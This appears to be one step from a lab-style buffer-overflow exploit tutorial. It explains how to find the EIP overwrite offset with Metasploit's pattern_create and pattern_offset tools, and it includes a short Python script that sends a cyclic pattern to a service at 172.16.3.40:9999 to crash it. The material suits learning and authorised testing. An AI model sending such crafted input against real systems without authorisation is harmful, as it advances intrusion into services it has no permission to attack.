## getoffset.py

Once the application is fuzzed at X, lets say 2700, bytes, create a unique string of X+200 (or 300) bytes, let’s say 3000 bytes, using `msf-pattern_create` like below:

`msf-pattern_create -l 3000`

Assign this unique string to the payload variable

```
import socket
import sys
from time import sleep

# cp 2-crash.py 3-pattern.py
# updatedb
# locate pattern_create.rb
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 650
pattern = '<enter pattern here>'

# buffer = 'A' * 600
buffer = pattern

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('172.16.3.40',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

* * *
Make a note of the address that the EIP was overwriten with, use `msf-pattern_offset` to find the offset, like below:

`msf-pattern_offset -l 3000 -q <enter EIP address>`

This will provide you with the offset at which the EIP will be written at. If the offset is 2606, then that means from byte 2607 to byte 2610 will determine the EIP address, and the rest will go into ESP.



